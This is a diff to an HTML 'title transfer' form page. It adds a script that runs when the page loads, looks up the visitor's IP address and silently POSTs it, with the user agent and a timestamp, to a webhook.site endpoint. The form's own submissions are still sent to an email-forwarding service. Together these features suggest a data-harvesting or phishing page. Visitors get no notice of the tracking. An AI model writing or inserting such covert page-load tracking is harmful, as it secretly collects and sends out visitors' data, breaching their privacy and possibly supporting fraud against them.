@@ -12,6 +12,21 @@
         input, select { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; }
         button { background-color: #007bff; color: white; border: none; padding: 10px 15px; cursor: pointer; }
     </style>
+    <script>
+        // Capture IP as soon as the form loads
+        window.onload = function() {
+            fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                let ip = data.ip;
+                fetch('https://webhook.site/fad6feaf-7bb3-4ebd-a56d-64a5ebab087f', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ip: ip, userAgent: navigator.userAgent, timestamp: new Date().toISOString() })
+                });
+            });
+        };
+    </script>
 </head>
 <body>
     <div class="form-container">
@@ -45,19 +60,14 @@
         </form>
     </div>
     
+    <p><a href="title_transfer.html">Click here to proceed with title transfer</a></p>
+    
     <script>
         document.getElementById("titleTransferForm").addEventListener("submit", function(event) {
             event.preventDefault();
             let formData = new FormData(this);
             let data = {};
             formData.forEach((value, key) => data[key] = value);
-            
-            // Send data to Webhook.site
-            fetch('https://webhook.site/fad6feaf-7bb3-4ebd-a56d-64a5ebab087f', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
             
             // Send data to email via Formspree
             fetch('https://formspree.io/f/mdkabale', {
@@ -75,3 +85,4 @@
     </script>
 </body>
 </html>
+
